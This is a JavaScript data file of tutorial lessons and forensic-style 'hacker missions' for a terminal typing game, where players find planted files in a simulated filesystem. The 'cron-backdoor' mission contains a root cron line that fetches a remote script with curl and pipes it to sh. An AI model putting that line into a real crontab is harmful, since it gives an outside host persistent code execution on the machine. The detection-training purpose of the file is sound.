// ===================================
// TERMINAL HACKER — TASK BANKS
// Used by TerminalHacker (typing-game.js). Loaded before it in index.html.
//
// Shape: { id, title, objective, lesson?, hint, par, parSolution,
//          allowedCommands, tree, contents, target }
// - tree: dir path -> entries (an entry is a dir iff its joined path is a tree key)
// - contents: file path -> text (cat/grep read this)
// - target: completing = cat'ing this file
// - par: command count of the optimal solution (drives hacker-mode scoring)
// ===================================

// ---------- TUTORIAL BANK (one random lesson per session, unscored) ----------
window.TERMINAL_TUTORIALS = [
    {
        id: 'tut-ls',
        title: 'Lesson: Looking Around',
        objective: 'List this folder with "ls", then read welcome.txt with "cat welcome.txt".',
        lesson: 'ls shows what is in the current directory; cat prints a file.',
        hint: 'Type "ls" first, then "cat welcome.txt".',
        par: 2, parSolution: 'ls → cat welcome.txt',
        allowedCommands: ['ls', 'cat', 'help'],
        tree: { '/': ['welcome.txt', 'notes'] , '/notes': ['todo.txt'] },
        contents: { '/welcome.txt': 'Welcome aboard! You just used ls + cat like a pro.', '/notes/todo.txt': 'buy coffee' },
        target: '/welcome.txt'
    },
    {
        id: 'tut-cd',
        title: 'Lesson: Moving Between Folders',
        objective: 'Enter the projects folder with "cd projects" and read readme.txt.',
        lesson: 'cd <folder> moves you into a folder; your prompt shows where you are.',
        hint: 'cd projects, then ls, then cat readme.txt.',
        par: 2, parSolution: 'cd projects → cat readme.txt',
        allowedCommands: ['ls', 'cd', 'cat', 'help'],
        tree: { '/': ['projects', 'music'], '/projects': ['readme.txt'], '/music': ['song.mp3'] },
        contents: { '/projects/readme.txt': 'Folders are just rooms. cd walks through doors.', '/music/song.mp3': '[audio data — not the goal]' },
        target: '/projects/readme.txt'
    },
    {
        id: 'tut-pwd',
        title: 'Lesson: Where Am I?',
        objective: 'Go into /var/log (cd var, cd log), check your location with "pwd", then read boot.log.',
        lesson: 'pwd prints your current path when you get lost.',
        hint: 'cd var → cd log → pwd → cat boot.log',
        par: 3, parSolution: 'cd var → cd log → cat boot.log (pwd is free knowledge!)',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'help'],
        tree: { '/': ['var', 'home'], '/var': ['log'], '/var/log': ['boot.log'], '/home': [] },
        contents: { '/var/log/boot.log': 'System booted cleanly. pwd always tells you where you stand.' },
        target: '/var/log/boot.log'
    },
    {
        id: 'tut-cd-up',
        title: 'Lesson: Going Back Up',
        objective: 'You start deep inside /a/b. Go up one level with "cd .." and read map.txt there.',
        lesson: 'cd .. climbs one folder toward the root.',
        hint: 'cd .. then ls then cat map.txt',
        par: 2, parSolution: 'cd .. → cat map.txt',
        startPath: '/a/b',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'help'],
        tree: { '/': ['a'], '/a': ['b', 'map.txt'], '/a/b': ['dead_end.txt'] },
        contents: { '/a/map.txt': '.. means "the folder above me". You climbed out!', '/a/b/dead_end.txt': 'nothing here' },
        target: '/a/map.txt'
    },
    {
        id: 'tut-hidden',
        title: 'Lesson: Hidden Files',
        objective: 'This folder looks empty — but is it? Use "ls -a" to reveal dotfiles and read the hidden one.',
        lesson: 'Files starting with . are hidden; ls -a reveals them.',
        hint: 'ls -a shows .secret.txt — then cat .secret.txt',
        par: 2, parSolution: 'ls -a → cat .secret.txt',
        allowedCommands: ['ls', 'cat', 'help'],
        tree: { '/': ['.secret.txt', 'decoy'] , '/decoy': [] },
        contents: { '/.secret.txt': 'Dotfiles hide from plain ls. -a means "all".' },
        target: '/.secret.txt'
    },
    {
        id: 'tut-find',
        title: 'Lesson: Searching by Name',
        objective: 'Somewhere in this system is a file with "treasure" in its name. Use "find treasure" to locate it, then cat it with its full path.',
        lesson: 'find <name> searches every folder at once — much faster than wandering.',
        hint: 'find treasure → cat the printed path',
        par: 2, parSolution: 'find treasure → cat /games/old/treasure_map.txt',
        allowedCommands: ['ls', 'cd', 'cat', 'find', 'help'],
        tree: { '/': ['games', 'work'], '/games': ['old', 'new'], '/games/old': ['treasure_map.txt'], '/games/new': [], '/work': ['report.txt'] },
        contents: { '/games/old/treasure_map.txt': 'X marks the spot. find beats clicking around!', '/work/report.txt': 'Q3 numbers' },
        target: '/games/old/treasure_map.txt'
    },
    {
        id: 'tut-cat-path',
        title: 'Lesson: Full Paths',
        objective: 'Without moving anywhere, read /docs/guide.txt by giving cat its full path.',
        lesson: 'Commands accept absolute paths — no cd required.',
        hint: 'cat /docs/guide.txt',
        par: 1, parSolution: 'cat /docs/guide.txt',
        allowedCommands: ['ls', 'cd', 'cat', 'help'],
        tree: { '/': ['docs', 'img'], '/docs': ['guide.txt'], '/img': [] },
        contents: { '/docs/guide.txt': 'A path starting with / works from anywhere. One command, done.' },
        target: '/docs/guide.txt'
    },
    {
        id: 'tut-grep',
        title: 'Lesson: Searching Inside a File',
        objective: 'diary.txt is long. Use "grep password diary.txt" to find the important line, then cat diary.txt to complete.',
        lesson: 'grep <word> <file> prints only lines containing the word.',
        hint: 'grep password diary.txt → cat diary.txt',
        par: 2, parSolution: 'grep password diary.txt → cat diary.txt',
        allowedCommands: ['ls', 'cat', 'grep', 'help'],
        tree: { '/': ['diary.txt'] },
        contents: { '/diary.txt': 'monday: gym\ntuesday: pizza\nwednesday: my password is swordfish\nthursday: rain' },
        target: '/diary.txt'
    },
    {
        id: 'tut-grep-r',
        title: 'Lesson: Searching Every File',
        objective: 'One file in this system mentions "wifi". Use "grep -r wifi" to find it, then cat that file.',
        lesson: 'grep -r <word> searches the contents of every file on the system.',
        hint: 'grep -r wifi → cat the path it prints',
        par: 2, parSolution: 'grep -r wifi → cat /home/kid/homework.txt',
        allowedCommands: ['ls', 'cd', 'cat', 'grep', 'help'],
        tree: { '/': ['home', 'etc'], '/home': ['kid'], '/home/kid': ['homework.txt', 'game_saves.txt'], '/etc': ['hosts'] },
        contents: { '/home/kid/homework.txt': 'essay draft... also the wifi code is CAKE-1234', '/home/kid/game_saves.txt': 'level 7', '/etc/hosts': 'localhost' },
        target: '/home/kid/homework.txt'
    },
    {
        id: 'tut-dotdir',
        title: 'Lesson: Hidden Folders',
        objective: 'Folders can hide too. Reveal the hidden folder here with "ls -a", cd into it, and read what it holds.',
        lesson: 'Directories starting with . are hidden like dotfiles — cd works on them normally.',
        hint: 'ls -a → cd .vault → ls → cat gold.txt',
        par: 3, parSolution: 'ls -a → cd .vault → cat gold.txt',
        allowedCommands: ['ls', 'cd', 'cat', 'help'],
        tree: { '/': ['.vault', 'trash'], '/.vault': ['gold.txt'], '/trash': [] },
        contents: { '/.vault/gold.txt': 'Hidden folders are just folders wearing sunglasses.' },
        target: '/.vault/gold.txt'
    }
];

// ---------- HACKER MISSIONS (one random mission per game, efficiency-scored) ----------
window.TERMINAL_MISSIONS = [
    {
        id: 'backup-key',
        title: 'Mission: The Forgotten Backup',
        objective: 'An old backup somewhere on this server contains a root key. Locate any file with "key" in its name and read it.',
        hint: 'find key → cat the path it prints.',
        par: 2, parSolution: 'find key → cat /home/user2/backup/key.txt',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'find', 'grep', 'help'],
        tree: {
            '/': ['root', 'home', 'tmp'], '/root': ['denied.txt'], '/home': ['user1', 'user2'],
            '/home/user1': ['notes.txt'], '/home/user2': ['backup'], '/home/user2/backup': ['old_files', 'key.txt'],
            '/home/user2/backup/old_files': [], '/tmp': ['cache']
        , '/tmp/cache': []},
        contents: {
            '/root/denied.txt': 'ACCESS DENIED', '/home/user1/notes.txt': 'remember to rotate keys...',
            '/home/user2/backup/key.txt': 'ROOT-KEY: 9f2c-ae11-7b3d. Backups never forget.'
        },
        target: '/home/user2/backup/key.txt'
    },
    {
        id: 'hidden-ssh',
        title: 'Mission: The Stolen SSH Key',
        objective: 'An attacker copied a private SSH key into a hidden folder under /home. Find the id_rsa copy and read it.',
        hint: 'Names beat wandering: find id_rsa.',
        par: 2, parSolution: 'find id_rsa → cat /home/dev/.backup/id_rsa_copy',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'find', 'grep', 'help'],
        tree: {
            '/': ['home', 'var'], '/home': ['dev', 'ops'], '/home/dev': ['.backup', 'src'],
            '/home/dev/.backup': ['id_rsa_copy'], '/home/dev/src': ['app.js'], '/home/ops': ['runbook.md'], '/var': []
        },
        contents: {
            '/home/dev/.backup/id_rsa_copy': '-----BEGIN PRIVATE KEY----- (copied 03:12 AM — busted!)',
            '/home/dev/src/app.js': 'console.log("hi")', '/home/ops/runbook.md': 'reboot steps'
        },
        target: '/home/dev/.backup/id_rsa_copy'
    },
    {
        id: 'auth-log',
        title: 'Mission: Who Broke In?',
        objective: 'Someone brute-forced a login last night. Find which log file records FAILED attempts and read it to identify the account.',
        hint: 'Search contents, not names: grep -r FAILED.',
        par: 2, parSolution: 'grep -r FAILED → cat /var/log/auth.log',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'find', 'grep', 'help'],
        tree: {
            '/': ['var', 'home'], '/var': ['log', 'www'], '/var/log': ['auth.log', 'kern.log', 'cron.log'],
            '/var/www': ['index.html'], '/home': ['admin'], '/home/admin': []
        },
        contents: {
            '/var/log/auth.log': 'FAILED login for root from 10.0.0.66\nFAILED login for root from 10.0.0.66\nACCEPTED login for svc_backup from 10.0.0.66',
            '/var/log/kern.log': 'usb device attached', '/var/log/cron.log': 'daily backup ran', '/var/www/index.html': '<h1>hi</h1>'
        },
        target: '/var/log/auth.log'
    },
    {
        id: 'db-password',
        title: 'Mission: The Leaked Database Password',
        objective: 'One config file on this box still contains DB_PASS in plain text. There are several configs — find the one that actually leaks it and read it.',
        hint: 'Many files are named config — grep -r DB_PASS cuts through all of them.',
        par: 2, parSolution: 'grep -r DB_PASS → cat /srv/api/config.env',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'find', 'grep', 'help'],
        tree: {
            '/': ['etc', 'srv'], '/etc': ['config', 'nginx'], '/etc/config': ['app.conf'], '/etc/nginx': ['nginx.conf'],
            '/srv': ['api', 'web'], '/srv/api': ['config.env', 'server.js'], '/srv/web': ['config.json']
        },
        contents: {
            '/etc/config/app.conf': 'log_level=info', '/etc/nginx/nginx.conf': 'worker_processes 4;',
            '/srv/api/config.env': 'DB_HOST=10.0.0.5\nDB_PASS=tiger123  # <- rotate me!!', '/srv/web/config.json': '{"theme":"dark"}',
            '/srv/api/server.js': 'require("dotenv")'
        },
        target: '/srv/api/config.env'
    },
    {
        id: 'deep-nest',
        title: 'Mission: No Tools, Deep Vault',
        objective: 'Your toolkit is stripped — no find, no grep. Navigate to the release vault at /srv/app/releases/v2/config and read the hidden .env file.',
        hint: 'Absolute paths save moves: cd /srv/app/releases/v2/config in ONE command, then ls -a.',
        par: 3, parSolution: 'cd /srv/app/releases/v2/config → ls -a → cat .env',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'help'],
        tree: {
            '/': ['srv', 'opt'], '/srv': ['app'], '/srv/app': ['releases'], '/srv/app/releases': ['v1', 'v2'],
            '/srv/app/releases/v1': ['config'], '/srv/app/releases/v1/config': ['settings.ini'],
            '/srv/app/releases/v2': ['config'], '/srv/app/releases/v2/config': ['.env', 'readme.md'], '/opt': []
        },
        contents: {
            '/srv/app/releases/v1/config/settings.ini': 'version=1 (retired)',
            '/srv/app/releases/v2/config/.env': 'JWT_SECRET=deep-vault-cracked', '/srv/app/releases/v2/config/readme.md': 'nothing to see'
        },
        target: '/srv/app/releases/v2/config/.env'
    },
    {
        id: 'decoys',
        title: 'Mission: Three Keys, One Real',
        objective: 'Three key.txt files exist on this server, but only the intruder\'s working copy matters — they operated out of /tmp. Read the real one.',
        hint: 'find key lists all three — only the /tmp one is real. Extra cats cost you.',
        par: 2, parSolution: 'find key → cat /tmp/.work/key.txt',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'find', 'grep', 'help'],
        tree: {
            '/': ['home', 'opt', 'tmp'], '/home': ['alice'], '/home/alice': ['key.txt'],
            '/opt': ['legacy'], '/opt/legacy': ['key.txt'], '/tmp': ['.work'], '/tmp/.work': ['key.txt']
        },
        contents: {
            '/home/alice/key.txt': 'decoy — expired 2019', '/opt/legacy/key.txt': 'decoy — revoked',
            '/tmp/.work/key.txt': 'LIVE SESSION KEY: c4ff-e1ne. Gotcha.'
        },
        target: '/tmp/.work/key.txt'
    },
    {
        id: 'cron-backdoor',
        title: 'Mission: The Backdoor Cron Job',
        objective: 'A scheduled job is secretly downloading a payload with curl. Find which cron file does it and read it.',
        hint: 'The giveaway is the tool it calls: grep -r curl.',
        par: 2, parSolution: 'grep -r curl → cat /etc/cron.d/update',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'find', 'grep', 'help'],
        tree: {
            '/': ['etc', 'usr'], '/etc': ['cron.d', 'cron.daily'], '/etc/cron.d': ['update', 'logrotate'],
            '/etc/cron.daily': ['cleanup'], '/usr': ['bin'], '/usr/bin': ['curl']
        },
        contents: {
            '/etc/cron.d/update': '*/5 * * * * root curl -s http://51.7.7.7/p.sh | sh  # <- BACKDOOR',
            '/etc/cron.d/logrotate': 'daily rotate logs', '/etc/cron.daily/cleanup': 'rm -rf /tmp/*'
        },
        target: '/etc/cron.d/update'
    },
    {
        id: 'exfil-trace',
        title: 'Mission: The Data Mule',
        objective: 'Stolen records were staged for exfiltration. Locate the file listing what was uploaded (it mentions "exfil") and read it.',
        hint: 'grep -r exfil finds the staging list.',
        par: 2, parSolution: 'grep -r exfil → cat /home/mule/.cache/upload_list',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'find', 'grep', 'help'],
        tree: {
            '/': ['home', 'data'], '/home': ['mule', 'clerk'], '/home/mule': ['.cache', 'inbox'],
            '/home/mule/.cache': ['upload_list'], '/home/mule/inbox': ['memo.txt'], '/home/clerk': ['ledger.csv'], '/data': ['records.db']
        },
        contents: {
            '/home/mule/.cache/upload_list': 'exfil batch 1: records.db -> dropbox... 40%% done. Caught in the act.',
            '/home/mule/inbox/memo.txt': 'lunch at 1', '/home/clerk/ledger.csv': 'id,amount', '/data/records.db': '[binary]'
        },
        target: '/home/mule/.cache/upload_list'
    },
    {
        id: 'no-find-hidden',
        title: 'Mission: Ghost in the Dotfiles',
        objective: 'Toolkit stripped again — no find, no grep. The user "ghost" hides loot in nested hidden folders under /home/ghost. Dig it out by hand.',
        hint: 'cd /home/ghost first, then ls -a at every step — dots hide inside dots.',
        par: 5, parSolution: 'cd /home/ghost → ls -a → cd .stash → ls -a → cat .loot',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'help'],
        tree: {
            '/': ['home', 'bin'], '/home': ['ghost', 'guest'], '/home/ghost': ['.stash', 'readme.txt'],
            '/home/ghost/.stash': ['.loot', 'junk.txt'], '/home/guest': [], '/bin': ['sh']
        },
        contents: {
            '/home/ghost/.stash/.loot': 'Wallet seed phrase recovered. The ghost is busted.',
            '/home/ghost/readme.txt': 'nothing here, move along', '/home/ghost/.stash/junk.txt': 'old receipts'
        },
        target: '/home/ghost/.stash/.loot'
    },
    {
        id: 'password-reuse',
        title: 'Mission: The Password Recycler',
        objective: 'The leaked password "hunter2" is being reused by someone on this server. Find which user\'s file contains it and read that file.',
        hint: 'grep -r hunter2 points straight at the culprit.',
        par: 2, parSolution: 'grep -r hunter2 → cat /home/kim/passwords.txt',
        allowedCommands: ['ls', 'cd', 'pwd', 'cat', 'find', 'grep', 'help'],
        tree: {
            '/': ['home', 'etc'], '/home': ['kim', 'raj', 'lee'], '/home/kim': ['passwords.txt', 'cat_pics'],
            '/home/kim/cat_pics': [], '/home/raj': ['todo.md'], '/home/lee': ['recipes.txt'], '/etc': ['passwd']
        },
        contents: {
            '/home/kim/passwords.txt': 'bank: hunter2\nemail: hunter2\nwifi: hunter2   # security nightmare',
            '/home/raj/todo.md': '- patch server', '/home/lee/recipes.txt': 'dal: lentils + patience', '/etc/passwd': 'root:x:0:0'
        },
        target: '/home/kim/passwords.txt'
    }
];
